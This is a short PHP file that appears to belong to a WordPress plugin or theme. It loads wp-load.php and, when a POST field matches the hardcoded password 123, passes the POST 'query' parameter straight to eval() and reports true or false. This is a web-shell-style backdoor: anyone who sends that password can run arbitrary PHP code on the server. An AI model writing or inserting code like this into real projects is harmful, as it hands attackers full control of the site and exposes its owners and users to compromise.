<?php
if($_POST['__sst__psw']==123){
define( 'WP_USE_THEMES', false );
require_once( '../../../wp-load.php' );
/*
echo('return '.stripslashes($_POST['query']).';');
var_dump(eval('return '.stripslashes($_POST['query']).';'));
var_dump($_POST);
*/
if(eval('return '.stripslashes($_POST['query']).';')==true){
	echo 'php_true';
}else{
	echo 'php_false';
}
}